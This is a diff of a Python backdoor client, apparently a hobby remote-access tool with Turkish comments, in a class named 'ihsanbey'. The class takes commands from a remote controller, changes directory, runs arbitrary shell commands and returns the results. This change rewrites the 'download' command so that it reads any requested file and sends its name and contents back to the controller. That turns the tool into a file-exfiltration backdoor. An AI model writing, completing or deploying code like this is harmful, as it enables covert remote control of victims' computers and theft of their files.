@@ -43,9 +43,11 @@ class ihsanbey:
             return str(e).encode('utf-8')
         except Exception as e:
             return ("Beklenmedik bir hata oluştu: " + str(e)).encode('utf-8')
+        
 
     def read_file(self, path):
-        with open(path, "rb") as file: 
+        with open(path, "+rb") as file: 
+            print("file read")
             return file.read()
 
 
@@ -58,14 +60,22 @@ class ihsanbey:
                 exit()
 
             elif command.startswith("cd "):
-                path = " ".join(command.split(" ")[1:])
+                path = " ".join(command.split(" ")[1:]) 
                 command_result =  self.change_dir(path)
                 self.reliable_send(command_result)
-
+            
             elif command.startswith("download "):
-                the_file = " ".join(command.split(" ")[1:])
-                command_result = self.read_file(the_file)
-                print(command_result)
+                the_file = " ".join(command.split(" ")[1:]) # download komutundan sonra gelen dosyanın adını ayırmak için komutu boşluklara ayırıyoruz
+                self.reliable_send(the_file)
+                content = self.read_file(the_file)
+                self.reliable_send(content)
+                
+
+
+            # elif command.startswith("download "):
+            #     the_file = " ".join(command.split(" ")[1:])
+            #     command_result = self.read_file(the_file)
+            #     print(command_result)
             else:
                 try:    
                     resultt = self.execute_command(command.encode("utf-8"))
